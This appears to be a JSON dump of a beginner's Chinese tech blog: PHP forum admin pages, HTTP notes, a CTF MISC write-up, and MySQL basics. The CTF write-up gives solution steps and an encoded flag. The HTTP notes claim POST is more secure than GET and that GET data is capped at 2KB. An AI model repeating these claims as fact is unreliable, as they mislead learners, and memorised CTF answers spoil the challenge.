&lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();if(!is_manage_login($link))&#123; header('Location:login.php');&#125;else&#123; session_unset();//Free all session variables session_destroy();//销毁一个会话中的全部数据 setcookie(session_name(),'',time()-3600,'/');//销毁保存在客户端的卡号（session id） header('Location:login.php');&#125;?&gt; 五、后台-系统1.系统信息index.php 要实现上述系统信息的显示，一些sql查询计数语句足矣！！ &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';$query=\"select * from manage where id=&#123;$_SESSION['manage']['id']&#125;\";$result_manage=execute($link, $query);$data_manage=mysqli_fetch_assoc($result_manage);$query=\"select count(*) from father_module\";$count_father_module=num($link,$query);$query=\"select count(*) from son_module\";$count_son_module=num($link,$query);$query=\"select count(*) from content\";$count_content=num($link,$query);$query=\"select count(*) from reply\";$count_reply=num($link,$query);$query=\"select count(*) from member\";$count_member=num($link,$query);$query=\"select count(*) from manage\";$count_manage=num($link,$query);if($data_manage['level']=='0')&#123; $data_manage['level']='超级管理员';&#125;else&#123; $data_manage['level']='普通管理员';&#125;$template['title']='系统信息';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt; &lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe06b;&lt;/i&gt;&lt;span&gt;欢迎管理员&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-wrap\"&gt; &lt;div class=\"result-title\"&gt; &lt;h1&gt;系统基本信息&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"result-content\"&gt; &lt;ul class=\"sys-info-list\"&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;您好: &lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo $data_manage['username']?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;所属角色：&lt;/label&gt;&lt;&lt;span class=\"res-info\"&gt;&lt;?php echo $data_manage['level']?&gt; &lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;创建时间：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo $data_manage['create_time']?&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=\"result-content\"&gt; &lt;ul&gt; &lt;li&gt; &lt;span class=\"res-info\"&gt; 父版块(&lt;?php echo $count_father_module?&gt;) 子版块(&lt;?php echo $count_son_module?&gt;) 帖子(&lt;?php echo $count_content?&gt;) 回复(&lt;?php echo $count_reply?&gt;) 会员(&lt;?php echo $count_member?&gt;) 管理员(&lt;?php echo $count_manage?&gt;) &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=\"result-content\"&gt; &lt;ul&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;服务器操作系统：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo PHP_OS?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;服务器软件：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo $_SERVER['SERVER_SOFTWARE']?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;MySQL 版本：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo mysqli_get_server_info($link)?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;最大上传文件：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo ini_get('upload_max_filesize')?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;内存限制：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo ini_get('memory_limit')?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span class=\"res-info\"&gt;&lt;a target=\"_blank\" href=\"phpinfo.php\"&gt;PHP 配置信息&lt;/a&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;div class=\"result-content\"&gt; &lt;ul&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;程序安装位置(绝对路径)：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo SA_PATH?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;程序在web根目录下的位置(首页的url地址)：&lt;/label&gt;&lt;span class=\"res-info\"&gt;&lt;?php echo SUB_URL?&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;程序版本：&lt;/label&gt;&lt;span class=\"res-info\"&gt;Qwzf V1.0 &lt;a target=\"_blank\" href=\"#\"&gt;[查看最新版本]&lt;/a&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=\"res-lab\"&gt;程序作者：&lt;/label&gt;&lt;span class=\"res-info\"&gt;Qwzf &lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;br /&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt;&lt;/div&gt;&lt;?php include_once 'inc/footer.inc.php';//footer?&gt; 查看PHP配置信息时跳转到另一个页面，用PHP自带查询配置信息语句。 phpinfo.php &lt;?php include_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';//验证管理员是否登录phpinfo();?&gt; 2.站点设置system.php 这是一个表单提交，提交网站标题、关键字、描述到数据库。且把网站标题从数据库查询，在页面标题处输出，即在顶部文件header.inc.php输出该页查询的网站标题。 &lt;?phpinclude_once '../inc/config.inc.php';include_once '../inc/mysql.inc.php';include_once '../inc/tool.inc.php';$link=connect();include_once 'inc/is_manage_login.inc.php';$query=\"select * from info where Id=1\";$result_info=execute($link, $query);$data_info=mysqli_fetch_assoc($result_info);if(isset($_POST['submit']))&#123; $_POST=escape($link,$_POST); $query=\"update info set title='&#123;$_POST['title']&#125;',keywords='&#123;$_POST['keywords']&#125;',description='&#123;$_POST['description']&#125;' where Id=1\"; execute($link, $query); if(mysqli_affected_rows($link)==1)&#123; skip('system.php','onCorrect.gif','修改成功！'); &#125;else&#123; skip('system.php','onError.gif','修改失败,请重试！'); &#125;&#125;$template['title']='站点设置页';?&gt;&lt;?phpinclude_once 'inc/header.inc.php';//topinclude_once 'inc/sidebar.inc.php';//sidebar?&gt; &lt;div class=\"main-wrap\"&gt; &lt;div class=\"crumb-wrap\"&gt; &lt;div class=\"crumb-list\"&gt;&lt;i class=\"icon-font\"&gt;&lt;/i&gt;&lt;a href=\"index.php\"&gt;首页&lt;/a&gt;&lt;span class=\"crumb-step\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"crumb-name\"&gt;站点设置&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"result-wrap\"&gt; &lt;form method=\"post\"&gt; &lt;div class=\"config-items\"&gt; &lt;div class=\"config-title\"&gt; &lt;h1&gt;&lt;i class=\"icon-font\"&gt;&amp;#xe00a;&lt;/i&gt;网站信息设置&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"result-content\"&gt; &lt;table width=\"100%\" class=\"insert-tab\"&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=\"require-red\"&gt;*&lt;/i&gt;网站标题：&lt;/th&gt; &lt;td&gt;&lt;input type=\"text\" id=\"\" value=\"&lt;?php echo $data_info['title']?&gt;\" size=\"85\" name=\"title\" class=\"common-text\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=\"require-red\"&gt;*&lt;/i&gt;关键字：&lt;/th&gt; &lt;td&gt;&lt;input type=\"text\" id=\"\" value=\"&lt;?php echo $data_info['keywords']?&gt;\" size=\"85\" name=\"keywords\" class=\"common-text\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;i class=\"require-red\"&gt;*&lt;/i&gt;描述：&lt;/th&gt; &lt;td&gt;&lt;input type=\"text\" id=\"\" value=\"&lt;?php echo $data_info['description']?&gt;\" size=\"85\" name=\"description\" class=\"common-text\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;&lt;/th&gt; &lt;td&gt; &lt;input type=\"submit\" value=\"提交\" name=\"submit\" class=\"btn btn-primary btn6 mr10\"&gt; &lt;input type=\"button\" value=\"返回\" onclick=\"history.go(-1)\" class=\"btn btn6\"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--/main--&gt;&lt;/div&gt;&lt;?phpinclude_once 'inc/footer.inc.php';//footer?&gt; 后台的基本功能已经实现了大部分，剩余的与前台有点关联，暂且先不做总结。。 感悟： 总结之后，对论坛后台开发，又有了新的认识。且熟悉了基本开发思路和流程。。后续我将会把论坛前台开发再总结一下。希望再次有所收获。。。小白进阶ing。。。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://qwzf.gitee.io/blog/tags/开发/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.gitee.io/blog/tags/PHP/"},{"name":"MySQL","slug":"MySQL","permalink":"https://qwzf.gitee.io/blog/tags/MySQL/"}],"author":"qwzf"},{"title":"HTTP协议基础","slug":"HTTP协议基础","date":"2019-05-29T12:39:42.147Z","updated":"2019-07-31T16:28:53.954Z","comments":true,"path":"2019/05/29/HTTP协议基础/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/05/29/HTTP协议基础/","excerpt":"","text":"因为想要学习抓包工具的使用，而抓包抓到是HTTP头流量包(有点看不太懂)，所以学习了一点HTTP协议的相关基础知识。。。。 一、初识HTTP协议1、HTTP协议是什么HTTP（Hypertext Transfer Protocol）中文“超文本传输协议”，是一种为分布式，合作式，多媒体信息系统服务，面向应用层的协议，是Internet上目前使用最广泛的应用层协议，它基于传输层的TCP协议进行通信，HTTP协议是通用的、无状态的协议。 作用：用于在服务器和客户机之间传输超文本文件。 二、HTTP协议在网络中的应用 三、HTTP协议基础知识1、HTTP的特点客户/服务器模式：一个服务器可以为分布在世界的许多客户服务。 简单：HTTP本身处理简单,有效地处理大量请求，HTTP服务器程序规模小，所以经由HTTP的通信速度快,与其它协议相比,时间开销小得多。 灵活: HTTP允许传输任意类型的数据对象，可以通过Content-type来指定数据类型。 无状态：HTTP是无状态的协议，缺少状态记忆,运行速度高,服务器应答速度较快。 2、HTTP的事务处理 客户端与服务器端建立连接 客户端向服务器端发送请求 服务器端向客户端回复响应 断开连接 3、消息链 4、HTTP的消息类型1.请求(Request)消息概念：由客户端发给服务器的消息。其组成包括:请求行(Request-Line)，可选的头域(Header Field )，及实体(Entity-Body)。 请求行请求行有3个元素:请求方法、URI、HTTP版本，最后以CRLF结尾，各个元素之间用SP字符隔开。 请求方法：指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。 URI:统一资源标识，简单地讲被请求资源所处的地址，如：http://www.taobao.com/pub/WWW/page.html， HTTP版本：HTTP/1.1，高版本的服务器接受低版本客户的请求，并向客户发送同样版本的应答；高版本的客户接受低版本服务器的应答。 方法： GET/POST 的区别 get是从服务器上获取数据，post是向服务器传送数据。 get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 get传送的数据量较小，不能大于2KB。post传送的数据量较大 get安全性非常低，post安全性较高。但是执行效率却比Post方法好。 报头行(报文头) 1、Connection：close 是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。 2、User-agent：Mozilla/4.0 指定用户代理服务器的类型。 3、Accept-Encoding：gzip,compress 指出发送此请求的浏览器支持哪些压缩编码方式。 4、Accept-languag：en 指出客户浏览器支持的语言是英语（english） 报文体(请求数据) 2.响应(Response)消息概念：服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息；HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 状态行HTTP/1.1 200 OK 状态行由协议版本、状态码、原因短语 3个元素组成，各个元素之间用SP分隔。状态码字段由三个数字组成，标识客户请求方法的结果。 状态码5种可能的值： 报头行(报文头) 1、Date：Thu,13Oct200503:17:33GMT 指出服务器创建并发送本响应消息的日期和时间。HTTP允许下面三种不同格式的日期/时间，但必须是格林尼治标准时间：HTTP-date=rfc1123-date|rfc-850-date| asctime-date 2、Server：Apache/2.0.54(Unix) 指出本消息是由Apache服务器产生的，服务器版本为2.0.54 3、Last—Nodified：Mon,22Jun199809;23;24GMT 指出对象本身的创建或最后修改日期或时间。 4、Last—Nodified: 报头项对于对象的高速缓存至关重要，且不论这种高速缓存是发生在本地客户主机上还是发生在网络高速缓存服务器主机(也就是代理服务器主机)上。 5、Content—Length：682l 指出所发送对象的字节数。 6、Content—Type：text/html 指出包含在实体中的对象是HTML文本。 5、HTTP和http区别HTTP通常承载在TCP协议之上,有时会承载在TLS、SSL之上，就是http http加解密过程 HTTP基础知识总算有点了解了。可以愉快的抓包分析修改了耶。。。小白进阶ing","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://qwzf.gitee.io/blog/categories/HTTP/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"HTTP","slug":"HTTP","permalink":"https://qwzf.gitee.io/blog/tags/HTTP/"},{"name":"抓包","slug":"抓包","permalink":"https://qwzf.gitee.io/blog/tags/抓包/"}],"author":"qwzf"},{"title":"ISCC-MISC做题总结","slug":"ISCC-MISC做题总结","date":"2019-05-27T10:53:14.795Z","updated":"2019-07-31T16:34:43.845Z","comments":true,"path":"2019/05/27/ISCC-MISC做题总结/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/05/27/ISCC-MISC做题总结/","excerpt":"","text":"本小白又来总结了。。虽然做题做的非常菜，但还是总结一下吧。总结一下做题思想，让自己能够不断提高。。。。 MISC1- (1)这道题主要是八进制转ascll码，然后base解码 下载附件，并解压，得到一个message.txt文件，打开 发现每个数字的每一位最高是7，考虑一下是不是8进制转换10(或16)进制，然后转ascll码。然后为了方便，我写了个代码转换(此时，再次想要抽时间学习python) #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; char arr[10000]; int i,j,k,res1=0; for(k=0;;k++) &#123; char res=0; scanf(\"%s\",arr); for(i=0;i&lt;strlen(arr);i++) &#123; res1+=(arr[i]-'0')*1; for(j=0;j&lt;strlen(arr)-i-1;j++) &#123; res1*=8; &#125; res+=res1; res1=0; &#125; printf(\"%c\",res); &#125; return 0;&#125; 运行，并把所有数字直接复制粘贴，然后执行，得V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K 看着，应该是base解码，所以在线解码得 果然想的不错。。。。。。。。。 MISC1- (2)这道题主要是LSB隐写 LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。 LSB隐写通过修改RGB颜色分量的最低位二进制（LSB），来进行信息的储存，人类的眼睛并不能感知到前后的变化。每个像数可以携带3bit的信息。 下载附件，并解压，得到一个文件，打开发现只有一张图片(倒立屋.png)，这时可以考虑一下是不是LSB隐写。用stegsolve打开图片 Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ 然而提交，发现不对。想到题目是倒立屋，所以试了下反着写。但又不对，然后尝试各种提交格式，结果没有任何格式的对了，即9102_cCsI MISC1- (3)这道题主要是键盘有关的密码(键盘手势) 首先，我先了解一下键盘密码，毕竟不能单纯只为了做题而做题 密码背景：凡是利用键盘的特性而制作的密码，都可以称之为键盘密码。 常见的分类：有计算机的键盘和手机的键盘两种，而这两种又根据具体的方法可以衍生出层出不穷的加密方法。 弱点：不安全，隐蔽性不强。 详细介绍 下载附件，并解压，得到一个文件，文件内容如下 于是把可能是flag的标记了一下。发现字母都是大写字母，看着在键盘上有点规律，仔细操作演示后发现，应该是对应键盘手势。所以把这行字母，运用键盘手势最终得到 MISC1- (4)这道题主要是常见的对称非、对称加密，这个题是AES加密 首先，需要了解知道常见的对称非、对称加密原理 下载文件，解压，发现里边是一个Aesop.gif图片。用winhex打开，在最下面发现一组可疑字符 比较像Base64编码，所以使用Base64在线解码 发现字符串Salted，应该是所谓“加盐”。就是对密码进行一些混淆增加破解的难度。 发现需要密码才能解密，于是再考虑一下题目文件图片，发现图片在变换很快，于是我使用PS把动态图还原，发现 这应该就是所需密码了，而密文应该就是之前winhex里的可疑字符串，然后开始解密，发现只有使用AES才能够解密 然而并没有出现有效结果，于是尝试再解密一次，发现了最终flag了！！！！ MISC2- (1)这道题主要是空格转二进制转16进制再转ascll码 下载文件并解压，得到txt文件 发现都是繁体字，想到繁体转简体，然而并没有什么用。。。然后分析之后发现有好多空格。每句话后都有空格，有的是一个，有的是两个。尝试一个空格转换成0，两个空格转换成1 我用的是notepad++的替换功能进行替换，替换完后，把所有繁体字删除得到 然后考虑，把二进制转换成16进制，再转ascii码 得到最终flag了！！！！ MISC2- (2)这道题主要是文件头部格式修复 下载文件并解压，得到exe文件。然而并不能运行。于是考虑用winhex打开，也可以用sublime打开，发现 应该和Base64有关，尝试Base64解码 发现这些字符应该能重新编码png图片。然而使用在线Base64转图片，结果失败了。应该是png某些格式有问题，于是考虑能不能用脚本转换。查询脚本并下载修改 运行得到 于是考虑001.png文件头格式是不是有问题，用winhex打开。比对png文件头格式，发现果然有问题 果然格式有问题，把00改成0A后，得到一张二维码 扫描后，进行得到 MISC2- (3)这道题主要是数据隐藏 下载文件并解压，得到png文件，png图像是个二维码。扫描二维码得 应该是base64加密，解密得 然后url解码得 然而并不是答案。。。。。 经过其他尝试，最终把二维码图片用winrar打开，发现 需要密码，于是想到之前解到的PASS{0K_I_L0V3_Y0u!}输入密码框，结果不对。所以密码应该是花括号里的内容。输入密码，解压txt文件并打开得到 得到最终结果啦！！！ MISC3- (1)这道题主要是数据隐藏 下载文件并解压，得到jpg文件，然而并不能打开 于是用winhex打开考虑修复文件头、文件尾。 发现文件尾没有问题。文件头有问题 修复文件头，图片果然显示出来了。然而并没有什么用。。。。。。。。。 于是，想着把修复后的图片用winrar打开试试。发现了一个文件夹，有点开心，难到答案要出来了。然而，是我想多了。。。。。 发现了50张二维码图片。。。。。一个一个的扫描感觉不太现实！于是我扫描了第1张和第50张 第1张 第50张 发现第50张比较可疑，把第50张二维码用winhex打开，发现flag了！！！ MISC3- (2)这道题主要是伪加密和数据隐藏 下载文件，解压发现 此时考虑压缩包加密文件是否是伪加密，所以用winhex打开，发现果然是伪加密 把文件头504B0304后的3、4位改为0000，以及把504B0102后的5、6位的0908改为0000，即可破解伪加密。然后解压，运行，发现 发现需要用户名和密码。于是把得到的exe文件用winhex打开，发现了用户名和密码。虽说winhex打开能找到用户名和密码，不过太乱不太好找。于是用了下逆向常用工具，发现用户名和密码了。。。 运行程序，输入用户名和密码，得到最终flag！！！！ MISC3- (3)这道题主要是音频隐写 下载文件并解压，得到png文件，然而并不能打开 于是用winhex打开考虑修复文件头、文件尾。发现文件头有问题，果断修复(把12改为89) 修复完后，得到一张二维码 扫描得到 百度查询发现这是当铺密码，于是当铺密码解密得 即`201902252228` 然后找寻其他有用信息，发现把得到的二维码用winrar打开，得到01.mp3音频文件。想到这应该就是音频隐写了。。。。在百度查询了一些信息，发现了一些有关音频隐写得工具，根据题目，得到了密钥和MP3文件。所以可能要使用mp3stego工具，得到最终答案。。。。 得到了个txt文件，打开发现 很明显，这是unicode编码，所以unicode解码得 得到最终flag了，开心！！！ ISCC杂项题(MISC)总算总结完毕，感觉又学到了很多知识。继续努力，小白进阶ing！！！！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"},{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.gitee.io/blog/tags/ISCC/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(四)","slug":"Web开发-PHP基础篇(四)","date":"2019-05-04T07:18:37.311Z","updated":"2019-08-01T05:33:30.028Z","comments":true,"path":"2019/05/04/Web开发-PHP基础篇(四)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/05/04/Web开发-PHP基础篇(四)/","excerpt":"","text":"一、数据库基本概念数据库：信息存储的仓库，包括一系列的关系措施！表:一个数据库中可以有若干张表（形式上你可以看出我们日常生活中建立的表）字段:表里面的信息会分若干个栏目来存，这些栏目，在数据库技术中叫”字段”,栏目里面存的具体信息叫”字段值”记录：一条信息我们叫一条记录一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表,每张表中可以有若干条记录。 二、MySQL支持的数据类型MySQL数据库中的数据类型主要分为：数值类型、日期类型、字符串类型。 1.数值类型1)整数类型tinyint、smallint、mediumint、int和bigint2)zerofill属性配合int(数字)来用，表示显示的时候一个显示宽度3)主键主键可以唯一标识某条记录的一个字段或者多个字段create table 表名(字段名称 类型 primary key,….);create table 表名(字段名称1 类型,….,primary key(字段名称1));删除：alter table 表名 drop primary key;注意：如果字段具有auto_increment属性必须先删除auto_increment属性4)小数的表示①浮点数单精度(float):单精度的浮点数精确到大约7位小数位(整数部分加上小数部分的位数)双精度精度(double):双精度的浮点数精确到大约15位小数位(整数部分加上小数部分的位数)②定点数decimal(7,2) 整数类型的字段常见的属性设置 1.UNSIGNED 无符号2.auto_increment自增(默认从1开始)，用于整数类型和带索引的字段，比如：配合主键使用（其他类型的索引我们以后再说）3.主键：主键可以唯一标识某条记录的一个字段或者多个字段 一个字段设为主键 多个字段组合设为主键注意点： 1)主键最好不要设置在某个与实际信息相关的字段上，主键的作用应该明确且单一 2)主键最好设置在整数类型的字段上面（处理或查询起来效率较高） 3)主键必须不同，并且不能为null 4)既然主键必须不同所以我们会配合 auto_increment属性 5)一个表只能有一个主键，最好只设置在一个字段上 6)根据主键的值来查询记录时可以获得极快的速度（因为设置了主键的字段已经创建了索引）！设置方法： 在创建表的时候 primary key(字段) primary key(字段1,字段2) 也可以直接写在需要创建主键的字段后面 如果忘了设置可以 alter table 表名 add primary key(字段名); 删除： alter table 表名 drop primary key; ​ 注意：如果字段具有auto_increment属性必须先删除auto_increment属性4.规定字段的值是否可以为null not null即不可以为null，该属性也可用于其他类型的字段5.设置默认值 default 值，该属性也可用于其他类型的字段 2.日期类型DATETIME是常用的日期类型create table t1(dt datetime);insert into t1 values(now());3.字符串类型CHAR(M) M为0~255之间的整数,表示可以存M个字符(不管是中文还是英文字符总共个数是M个就OK) VARCHAR(M) M为0~65535之间的整数,表示可以存M个字符,具体M最大多大和字符集有密切关系注意varchar列的最大的存储空间是65,532字节,如果是英文字符集(一个英文字符占1个字节)就是可以放65532个英文字符自己在实际开发的过程中M设置的值，应该从自己的实际需求去考虑，而不是最大能存多少个字符，因为超过最大能设定的字符数会自动报错或者警告！TINYTEXT 允许长度0~255字符TEXT 允许长度0~65535字符MEDIUMTEXT 允许长度0~16,777,215字符LONGTEXT 允许长度0~4,294,967,295字符 注意点：char与varchar列的区别char类型的字符所占的存储空间是固定,不管你用的时候存了几个字符，它所占的空间都是你当初设定的字符空间 比如char(255) 哪怕你存的只是1个a，那么它也是站255个字符长度的空间!varchar列所占的存储空间是可变的,根据存入的字符长度来确定实际占多少的空间! varchar(255) 实际所占的空间就是实际字符的长度+1个字节！ varchar(超过255) 实际所占的空间就是实际字符的长度+2个字节！ 更节省空间!在检索时，char列删除尾部的空格，而varchar则保留这些空格。选择：由于char是固定长度，所以它的处理速度比varchar快，但是缺点是浪费存储空间。所以对于那些长度变化不大的数据可以选择此列 三、MySQL使用SQL分类： DDL(Data Definition Languages)语句 数据定义语句，通过这类语言可以对数据库进行创建删除更改 DML(Data Manipulation Language)语句 数据操纵语句，用于添加、删除、更新和查询数据库记录并检查数据完整性 DCL(Data Control Language)语句 数据控制语句，通过此类语句可以对数据库的相关权限进行设置 DDL语句了解1.首先需要登录MySQL， mysql -u用户名 -p敲回车键，然后输入密码 2.命令结束符用“;”或“\\g” 3.客户端的连接ID,这个数字记录了MySQL服务到目前为止的连接次数；每个新连接都会自动加1 用法1.创建数据库 1&gt;create database 数据库名; 2&gt;选择要操作的数据库：use 数据库; 3&gt;查看数据中所有的数据表show tables; 例： mysql&gt; create database myph;Query OK, 1 row affected (0.00 sec)mysql&gt; use myphDatabase changedmysql&gt; show tables;Empty set (0.00 sec) 2.删除数据库 ​ drop database 数据库名称; mysql&gt; drop database myph;Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bts || challenges || demo || myphp || mysql || performance_schema || security |+--------------------+8 rows in set (0.00 sec) 3.创建表 1)创建表 ​ create table 表名( `字段1名 字段1类型 列的约束条件,` `字段2名 字段2类型 列的约束条件,` `...` ​ ) 例： mysql&gt; create table user(id int ,name varchar(35),password varchar(40));Query OK, 0 rows affected (0.00 sec) 列的约束条件部分可以设置很多信息比如，默认值设置：default null 2)创建完表之后可以查看表的定义 ​ desc 表名; 例： mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | varchar(35) | YES | | NULL | || password | varchar(40) | YES | | NULL | |+----------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec) 3)查看创建表的SQL语句 ​ show create table 表名 \\G 例： mysql&gt; show create table user \\G*************************** 1. row *************************** Table: userCreate Table: CREATE TABLE `user` ( `id` int(11) DEFAULT NULL, `name` varchar(35) DEFAULT NULL, `password` varchar(40) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf81 row in set (0.00 sec) \\G选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录，\\G后面无需再加分号 4.删除表 ​ drop table 表名; 5.修改表 1)修改表类型 ​ alter table 表名 modify [column] 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user modify column name tinyint;Query OK, 0 rows affected (0.01 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | tinyint(4) | YES | | NULL | || password | varchar(40) | YES | | NULL | |+----------+-------------+------+-----+---------+-------+ 2)增加表字段 ​ alter table 表名 add [column] 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user add column wer int;Query OK, 0 rows affected (0.02 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | tinyint(4) | YES | | NULL | || password | varchar(40) | YES | | NULL | || wer | int(11) | YES | | NULL | |+----------+-------------+------+-----+---------+-------+4 rows in set (0.00 sec) 3)删除表字段 ​ alter table 表名 drop [column] 字段名; 例： mysql&gt; alter table user drop column name;Query OK, 0 rows affected (0.01 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || password | varchar(40) | YES | | NULL | || wer | int(11) | YES | | NULL | |+----------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec) 4)字段改名 ​ alter table 表名 change [column] 旧的字段名 字段定义 [first|after 字段名]; 例： mysql&gt; alter table user change wer qwzf int;Query OK, 0 rows affected (0.01 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || password | varchar(40) | YES | | NULL | || qwzf | int(11) | YES | | NULL | |+----------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec) 注：change与modify都可以修改表的定义，不同的是change后面需要接两次列名，不方便，但是优点是change可以修改字段名称 5)修改字段排列排序 前面介绍的字段增加和修改语法(add/change/modify)中，都有一个可选项first|after 字段名,这个选择可以用来修改 字段在表中的位置新增的字段默认是加载在表中最后位置，而change/modify 默认都不会改变字段的位置 注意：change/first|after 字段名 这些关键字都是属于MySQL在标准SQL上的扩展，在其他的数据库上不一定适用 6)更改表名 alter table 表名 rename [to] 新的表名; 例： mysql&gt; alter table user rename to users;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+----------------+| Tables_in_myph |+----------------+| users |+----------------+1 row in set (0.00 sec) DML语句因为之前学习过MySQL的增删改查操作，这一部分可以参考一下我之前的博客，MySQL的简单使用 查询 select * from 表名;1)插入记录 1&gt;插入记录 insert into 